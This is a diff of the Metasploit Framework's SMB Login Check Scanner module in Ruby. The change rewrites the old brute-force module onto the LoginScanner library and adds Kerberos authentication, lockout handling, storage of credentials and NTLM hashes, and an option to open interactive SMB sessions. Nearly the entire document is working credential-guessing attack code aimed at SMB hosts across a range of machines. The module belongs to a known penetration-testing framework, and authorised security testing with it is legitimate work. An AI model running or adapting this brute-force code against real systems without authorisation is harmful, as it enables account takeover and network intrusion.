@@ -1,300 +1,335 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'metasploit/framework/login_scanner/smb'
+require 'metasploit/framework/credential_collection'
 
-require 'msf/core'
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::DCERPC
+  include Msf::Exploit::Remote::SMB::Client
+  include Msf::Exploit::Remote::SMB::Client::Authenticated
 
-class Metasploit3 < Msf::Auxiliary
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
+  include Msf::Auxiliary::CommandShell
+  include Msf::Sessions::CreateSessionOptions
+  include Msf::Auxiliary::ReportSummary
 
-	include Msf::Exploit::Remote::DCERPC
-	include Msf::Exploit::Remote::SMB
-	include Msf::Exploit::Remote::SMB::Authenticated
+  Aliases = [
+    'auxiliary/scanner/smb/login'
+  ].freeze
 
-	include Msf::Auxiliary::Scanner
-	include Msf::Auxiliary::Report
-	include Msf::Auxiliary::AuthBrute
+  def proto
+    'smb'
+  end
 
-	attr_reader :accepts_bogus_domains
+  def initialize
+    super(
+      'Name' => 'SMB Login Check Scanner',
+      'Description' => %q{
+        This module will test a SMB login on a range of machines and
+        report successful logins.  If you have loaded a database plugin
+        and connected to a database this module will record successful
+        logins and hosts so you can track your access.
+      },
+      'Author' => [
+        'tebo <tebo[at]attackresearch.com>', # Original
+        'Ben Campbell', # Refactoring
+        'Brandon McCann "zeknox" <bmccann[at]accuvant.com>', # admin check
+        'Tom Sellers <tom[at]fadedcode.net>' # admin check/bug fix
+      ],
+      'References' => [
+        [ 'CVE', '1999-0506'], # Weak password
+        [ 'ATT&CK', Mitre::Attack::Technique::T1021_002_SMB_WINDOWS_ADMIN_SHARES ],
+        [ 'ATT&CK', Mitre::Attack::Technique::T1110_BRUTE_FORCE ],
+      ],
+      'License' => MSF_LICENSE,
+      'DefaultOptions' => {
+        'DB_ALL_CREDS' => false,
+        'BLANK_PASSWORDS' => false,
+        'USER_AS_PASS' => false,
+        'CreateSession' => false
+      }
+    )
 
-	def proto
-		'smb'
-	end
-	def initialize
-		super(
-			'Name'           => 'SMB Login Check Scanner',
-			'Description'    => %q{
-				This module will test a SMB login on a range of machines and
-				report successful logins.  If you have loaded a database plugin
-				and connected to a database this module will record successful
-				logins and hosts so you can track your access.
-			},
-			'Author'         => 'tebo <tebo [at] attackresearch [dot] com>',
-			'References'     =>
-				[
-					[ 'CVE', '1999-0506'] # Weak password
-				],
-			'License'     => MSF_LICENSE
-		)
-		deregister_options('RHOST','USERNAME','PASSWORD')
+    # These are normally advanced options, but for this module they have a
+    # more active role, so make them regular options.
+    register_options(
+      [
+        Opt::Proxies,
+        OptBool.new('ABORT_ON_LOCKOUT', [ true, 'Abort the run when an account lockout is detected', false ]),
+        OptBool.new('PRESERVE_DOMAINS', [ false, 'Respect a username that contains a domain name.', true ]),
+        OptBool.new('RECORD_GUEST', [ false, 'Record guest-privileged random logins to the database', false ]),
+        OptBool.new('DETECT_ANY_AUTH', [false, 'Enable detection of systems accepting any authentication', false]),
+        OptBool.new('DETECT_ANY_DOMAIN', [false, 'Detect if domain is required for the specified user', false]),
+        OptBool.new('CreateSession', [false, 'Create a new session for every successful login', false])
+      ]
+    )
 
-		@accepts_bogus_domains = []
-		@accepts_guest_logins = {}
+    options_to_deregister = %w[USERNAME PASSWORD CommandShellCleanupCommand AutoVerifySession KrbCacheMode]
 
-		# These are normally advanced options, but for this module they have a
-		# more active role, so make them regular options.
-		register_options(
-			[
-				OptString.new('SMBPass', [ false, "SMB Password" ]),
-				OptString.new('SMBUser', [ false, "SMB Username" ]),
-				OptString.new('SMBDomain', [ false, "SMB Domain", 'WORKGROUP']),
-				OptBool.new('PRESERVE_DOMAINS', [ false, "Respect a username that contains a domain name.", true]),
-				OptBool.new('RECORD_GUEST', [ false, "Record guest-privileged random logins to the database", false]),
-			], self.class)
-	end
+    if framework.features.enabled?(Msf::FeatureManager::SMB_SESSION_TYPE)
+      add_info('New in Metasploit 6.4 - The %grnCreateSession%clr option within this module can open an interactive session')
+    else
+      # Don't give the option to create a session unless smb sessions are enabled
+      options_to_deregister << 'CreateSession'
+    end
 
-	def run_host(ip)
-		print_brute(:level => :vstatus, :ip => ip, :msg => "Starting SMB login bruteforce")
+    deregister_options(*options_to_deregister)
+  end
 
-		if accepts_bogus_logins?
-			print_error("#{smbhost} - This system accepts authentication with any credentials, brute force is ineffective.")
-			return
-		end
+  def create_session?
+    # The CreateSession option is de-registered if SMB_SESSION_TYPE is not enabled
+    # but the option can still be set/saved so check to see if we should use it
+    if framework.features.enabled?(Msf::FeatureManager::SMB_SESSION_TYPE)
+      datastore['CreateSession']
+    else
+      false
+    end
+  end
 
-		begin
-			if accepts_guest_logins?
-				print_error("#{ip} - This system allows guest sessions with any credentials, these instances will not be reported.")
-			end
-		end unless datastore['RECORD_GUEST']
+  def run
+    results = super
+    logins = results.flat_map { |_k, v| v[:successful_logins] }
+    sessions = results.flat_map { |_k, v| v[:successful_sessions] }
+    print_status("Bruteforce completed, #{logins.size} #{logins.size == 1 ? 'credential was' : 'credentials were'} successful.")
+    return results unless framework.features.enabled?(Msf::FeatureManager::SMB_SESSION_TYPE)
 
-		begin
-			each_user_pass do |user, pass|
-				result = try_user_pass(user, pass)
-				if result == :next_user
-					unless user == user.downcase
-						result = try_user_pass(user.downcase, pass)
-						if result == :next_user
-							print_status("Username is case insensitive")
-							user = user.downcase
-						end
-					end
-					report_creds(user,pass) if @accepts_guest_logins.select{ |g_host, g_creds| g_host == ip and g_creds == [user,pass] }.empty?
-				end
-			end
-		rescue ::Rex::ConnectionError
-			nil
-		end
+    if create_session?
+      print_status("#{sessions.size} SMB #{sessions.size == 1 ? 'session was' : 'sessions were'} opened successfully.")
+    else
+      print_status('You can open an SMB session with these credentials and %grnCreateSession%clr set to true')
+    end
+    results
+  end
 
-	end
+  def run_host(ip)
+    print_brute(level: :vstatus, ip: ip, msg: 'Starting SMB login bruteforce')
 
-	def accepts_guest_logins?
-		guest = false
-		orig_user,orig_pass = datastore['SMBUser'],datastore['SMBPass']
-		datastore["SMBUser"] = Rex::Text.rand_text_alpha(8)
-		datastore["SMBPass"] = Rex::Text.rand_text_alpha(8)
+    domain = datastore['SMBDomain'] || ''
 
-		# Connection problems are dealt with at a higher level
-		connect()
+    kerberos_authenticator_factory = nil
+    if datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS
+      fail_with(Msf::Exploit::Failure::BadConfig, 'The Smb::Rhostname option is required when using Kerberos authentication.') if datastore['Smb::Rhostname'].blank?
+      fail_with(Msf::Exploit::Failure::BadConfig, 'The SMBDomain option is required when using Kerberos authentication.') if datastore['SMBDomain'].blank?
+      fail_with(Msf::Exploit::Failure::BadConfig, 'The DomainControllerRhost is required when using Kerberos authentication.') if datastore['DomainControllerRhost'].blank?
 
-		begin
-			smb_login()
-		rescue ::Rex::Proto::SMB::Exceptions::LoginError => e
-		end
+      if datastore['SMBPass'].blank?
+        # In case no password has been provided, we assume the user wants to use Kerberos tickets stored in cache
+        # Write mode is still enable in case new TGS tickets are retrieved.
+        ticket_storage = kerberos_ticket_storage({ read: true, write: true })
+      else
+        # Write only cache so we keep all gathered tickets but don't reuse them for auth while running the module
+        ticket_storage = kerberos_ticket_storage({ read: false, write: true })
+      end
 
-		begin
-			guest = true
-			@accepts_guest_logins['rhost'] ||=[] unless @accepts_guest_logins.include?(rhost)
-			report_note(
-				:host	=> rhost,
-				:proto => 'tcp',
-				:sname	=> 'smb',
-				:port   =>  datastore['RPORT'],
-				:type   => 'smb.account.info',
-				:data   => 'accepts guest login from any account',
-				:update => :unique_data
-			)
-		end unless(simple.client.auth_user)
+      kerberos_authenticator_factory = lambda do |username, password, realm|
+        Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::SMB.new(
+          host: datastore['DomainControllerRhost'],
+          hostname: datastore['Smb::Rhostname'],
+          proxies: datastore['Proxies'],
+          realm: realm,
+          username: username,
+          password: password,
+          framework: framework,
+          framework_module: self,
+          cache_file: datastore['Smb::Krb5Ccname'].blank? ? nil : datastore['Smb::Krb5Ccname'],
+          ticket_storage: ticket_storage,
+          clock_skew: kerberos_clock_skew_seconds
+        )
+      end
+    end
 
-		disconnect()
-		datastore['SMBUser'],datastore['SMBPass'] = orig_user,orig_pass
-		return guest
+    @scanner = Metasploit::Framework::LoginScanner::SMB.new(
+      configure_login_scanner(
+        host: ip,
+        port: rport,
+        local_port: datastore['CPORT'],
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        proxies: datastore['Proxies'],
+        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
+        connection_timeout: 5,
+        max_send_size: datastore['TCP::max_send_size'],
+        send_delay: datastore['TCP::send_delay'],
+        framework: framework,
+        framework_module: self,
+        always_encrypt: datastore['SMB::AlwaysEncrypt'],
+        versions: datastore['SMB::ProtocolVersion'].split(',').map(&:strip).reject(&:blank?).map(&:to_i),
+        kerberos_authenticator_factory: kerberos_authenticator_factory,
+        use_client_as_proof: create_session?
+      )
+    )
 
-	end
+    if datastore['DETECT_ANY_AUTH']
+      bogus_result = @scanner.attempt_bogus_login(domain)
+      if bogus_result.success?
+        if bogus_result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST
+          print_status('This system allows guest sessions with random credentials')
+        else
+          print_error('This system accepts authentication with random credentials, brute force is ineffective.')
+          return
+        end
+      else
+        vprint_status('This system does not accept authentication with random credentials, proceeding with brute force')
+      end
+    end
 
+    cred_collection = build_credential_collection(
+      realm: domain,
+      username: datastore['SMBUser'],
+      password: datastore['SMBPass'],
+      nil_passwords: datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS && datastore['SMBPass'].blank?
+    )
+    cred_collection = prepend_db_hashes(cred_collection)
 
-	def accepts_bogus_logins?
-		orig_user,orig_pass = datastore['SMBUser'],datastore['SMBPass']
-		datastore["SMBUser"] = Rex::Text.rand_text_alpha(8)
-		datastore["SMBPass"] = Rex::Text.rand_text_alpha(8)
+    @scanner.cred_details = cred_collection
+    successful_logins = []
+    successful_sessions = []
+    @scanner.scan! do |result|
+      case result.status
+      when Metasploit::Model::Login::Status::LOCKED_OUT
+        if datastore['ABORT_ON_LOCKOUT']
+          print_error("Account lockout detected on '#{result.credential.public}', aborting.")
+          break
+        else
+          print_error("Account lockout detected on '#{result.credential.public}', skipping this user.")
+        end
 
-		# Connection problems are dealt with at a higher level
-		connect()
+      when Metasploit::Model::Login::Status::DENIED_ACCESS
+        print_brute level: :status, ip: ip, msg: "Correct credentials, but unable to login: '#{result.credential}', #{result.proof}"
+        report_creds(ip, rport, result)
+        :next_user
+      when Metasploit::Model::Login::Status::SUCCESSFUL
+        print_brute level: :good, ip: ip, msg: "Success: '#{result.credential}' #{result.access_level}"
+        successful_logins << result
+        report_creds(ip, rport, result)
+        if create_session?
+          begin
+            successful_sessions << session_setup(result)
+          rescue ::StandardError => e
+            elog('Failed to setup the session', error: e)
+            print_brute level: :error, ip: ip, msg: "Failed to setup the session - #{e.class} #{e.message}"
+            result.connection.close unless result.connection.nil?
+          end
+        end
+        :next_user
+      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
+        if datastore['VERBOSE']
+          print_brute level: :verror, ip: ip, msg: 'Could not connect'
+        end
+        invalidate_login(
+          address: ip,
+          port: rport,
+          protocol: 'tcp',
+          public: result.credential.public,
+          private: result.credential.private,
+          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+          realm_value: result.credential.realm,
+          last_attempted_at: DateTime.now,
+          status: result.status
+        )
+        :abort
+      when Metasploit::Model::Login::Status::INCORRECT
+        if datastore['VERBOSE']
+          print_brute level: :verror, ip: ip, msg: "Failed: '#{result.credential}', #{result.proof}"
+        end
+        invalidate_login(
+          address: ip,
+          port: rport,
+          protocol: 'tcp',
+          public: result.credential.public,
+          private: result.credential.private,
+          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+          realm_value: result.credential.realm,
+          last_attempted_at: DateTime.now,
+          status: result.status
+        )
+      end
+    end
+    { successful_logins: successful_logins, successful_sessions: successful_sessions }
+  end
 
-		begin
-			smb_login()
-		rescue ::Rex::Proto::SMB::Exceptions::LoginError => e
-		end
+  # This logic is not universal ie a local account will not care about workgroup
+  # but remote domain authentication will so check each instance
+  def accepts_bogus_domains?(user, pass)
+    bogus_domain = @scanner.attempt_login(
+      Metasploit::Framework::Credential.new(
+        public: user,
+        private: pass,
+        realm: Rex::Text.rand_text_alpha(8)
+      )
+    )
 
-		disconnect()
-		datastore['SMBUser'],datastore['SMBPass'] = orig_user,orig_pass
+    return bogus_domain.success?
+  end
 
-		return simple.client.auth_user ? true : false
-	end
+  def report_creds(ip, port, result)
+    # Private can be nil if we authenticated with Kerberos and a cached ticket was used. No need to report this.
+    return unless result.credential.private
 
-	def accepts_bogus_domains?(addr)
-		if @accepts_bogus_domains.include? addr
-			return true
-		end
-		orig_domain = datastore['SMBDomain']
-		datastore['SMBDomain'] = Rex::Text.rand_text_alpha(8)
+    if !datastore['RECORD_GUEST'] && (result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST)
+      return
+    end
 
-		connect()
-		begin
-			smb_login()
-		rescue ::Rex::Proto::SMB::Exceptions::LoginError => e
-		end
-		disconnect()
-		datastore['SMBDomain'] = orig_domain
+    service_data = {
+      address: ip,
+      port: port,
+      service_name: 'smb',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
 
-		if simple.client.auth_user
-			@accepts_bogus_domains << addr
-			return true
-		else
-			return false
-		end
-	end
+    credential_data = {
+      module_fullname: fullname,
+      origin_type: :service,
+      private_data: result.credential.private,
+      private_type: (
+        Rex::Proto::NTLM::Utils.is_pass_ntlm_hash?(result.credential.private) ? :ntlm_hash : :password
+      ),
+      username: result.credential.public
+    }.merge(service_data)
 
-	def try_user_pass(user, pass)
-		# The SMB mixins require the datastores "SMBUser" and
-		# "SMBPass" to be populated.
-		datastore["SMBPass"] = pass
-		orig_domain = datastore["SMBDomain"]
-		# Note that unless PRESERVE_DOMAINS is true, we're more
-		# than happy to pass illegal usernames that contain
-		# slashes.
-		if datastore["PRESERVE_DOMAINS"]
-			d,u = domain_username_split(user)
-			datastore["SMBUser"] = u.to_s.gsub(/<BLANK>/i,"")
-			datastore["SMBDomain"] = d if d
-		else
-			datastore["SMBUser"] = user.to_s.gsub(/<BLANK>/i,"")
-		end
+    if datastore['DETECT_ANY_DOMAIN'] && domain.present?
+      if accepts_bogus_domains?(result.credential.public, result.credential.private)
+        print_brute(level: :vstatus, ip: ip, msg: "Domain is ignored for user #{result.credential.public}")
+      else
+        credential_data.merge!(
+          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+          realm_value: result.credential.realm
+        )
+      end
+    end
 
-		# Connection problems are dealt with at a higher level
-		connect()
+    credential_core = create_credential(credential_data)
 
-		begin
-			smb_login()
-		rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
-			if e.get_error(e.error_code) == "STATUS_ACCESS_DENIED"
-				print_error("#{smbhost} - FAILED LOGIN (#{smb_peer_os}) #{splitname(user)} : #{pass} (#{e.get_error(e.error_code)})")
-				disconnect()
-				datastore["SMBDomain"] = orig_domain
-				return :skip_user
-			else
-				raise e
-			end
+    login_data = {
+      access_level: result.access_level,
+      core: credential_core,
+      last_attempted_at: DateTime.now,
+      status: result.status
+    }.merge(service_data)
 
-		rescue ::Rex::Proto::SMB::Exceptions::LoginError => e
+    create_credential_login(login_data)
+  end
 
-			case e.error_reason
-			when 'STATUS_LOGON_FAILURE', 'STATUS_ACCESS_DENIED'
-				# Nothing interesting
-				vprint_error("#{smbhost} - FAILED LOGIN (#{smb_peer_os}) #{splitname(user)} : #{pass} (#{e.error_reason})")
-				disconnect()
-				datastore["SMBDomain"] = orig_domain
-				return
+  # @param [Metasploit::Framework::LoginScanner::Result] result
+  # @return [Msf::Sessions::SMB]
+  def session_setup(result)
+    return unless (result.connection && result.proof)
 
-			when 'STATUS_ACCOUNT_DISABLED'
-				report_note(
-					:host	=> rhost,
-					:proto => 'tcp',
-					:sname	=> 'smb',
-					:port   =>  datastore['RPORT'],
-					:type   => 'smb.account.info',
-					:data   => {:user => user, :status => "disabled"},
-					:update => :unique_data
-				)
+    my_session = Msf::Sessions::SMB.new(result.connection, { client: result.proof })
+    merge_me = {
+      'USERPASS_FILE' => nil,
+      'USER_FILE' => nil,
+      'PASS_FILE' => nil,
+      'USERNAME' => result.credential.public,
+      'PASSWORD' => result.credential.private
+    }
 
-			when 'STATUS_PASSWORD_EXPIRED'
-				report_note(
-					:host	=> rhost,
-					:proto => 'tcp',
-					:sname	=> 'smb',
-					:port   =>  datastore['RPORT'],
-					:type   => 'smb.account.info',
-					:data   => {:user => user, :status => "expired password"},
-					:update => :unique_data
-				)
-
-			when 'STATUS_ACCOUNT_LOCKED_OUT'
-				report_note(
-					:host	=> rhost,
-					:proto => 'tcp',
-					:sname	=> 'smb',
-					:port   =>  datastore['RPORT'],
-					:type   => 'smb.account.info',
-					:data   => {:user => user, :status => "locked out"},
-					:update => :unique_data
-				)
-			end
-			print_error("#{smbhost} - FAILED LOGIN (#{smb_peer_os}) #{splitname(user)} : #{pass} (#{e.error_reason})")
-
-			disconnect()
-			datastore["SMBDomain"] = orig_domain
-			return :skip_user # These reasons are sufficient to stop trying.
-		end
-
-		if(simple.client.auth_user)
-			print_status("Auth-User: #{simple.client.auth_user.inspect}")
-			print_good("#{smbhost} - SUCCESSFUL LOGIN (#{smb_peer_os}) '#{splitname(user)}' : '#{pass}'")
-		else
-			print_status("#{rhost} - GUEST LOGIN (#{smb_peer_os}) #{splitname(user)} : #{pass}")
-			@accepts_guest_logins[rhost] = [user, pass] unless datastore['RECORD_GUEST']
-		end
-
-		disconnect()
-		# If we get here then we've found the password for this user, move on
-		# to the next one.
-		datastore["SMBDomain"] = orig_domain
-		return :next_user
-	end
-
-	def report_creds(user,pass)
-
-		report_hash = {
-			:host	=> rhost,
-			:port   => datastore['RPORT'],
-			:sname	=> 'smb',
-			:pass   => pass,
-			:source_type => "user_supplied",
-			:active => true
-		}
-		if accepts_bogus_domains? rhost
-			if datastore["PRESERVE_DOMAINS"]
-				d,u = domain_username_split(user)
-				report_hash[:user] = u
-			else
-				report_hash[:user] = "#{datastore["SMBUser"]}"
-			end
-		else
-			if datastore["PRESERVE_DOMAINS"]
-				d,u = domain_username_split(user)
-				report_hash[:user] = "#{datastore["SMBDomain"]}/#{u}"
-			else
-				report_hash[:user] = "#{datastore["SMBDomain"]}/#{datastore["SMBUser"]}"
-			end
-		end
-
-		if pass =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/
-			report_hash.merge!({:type => 'smb_hash'})
-		else
-			report_hash.merge!({:type => 'password'})
-		end
-		report_auth_info(report_hash)
-	end
+    start_session(self, nil, merge_me, false, my_session.rstream, my_session)
+  end
 
 end
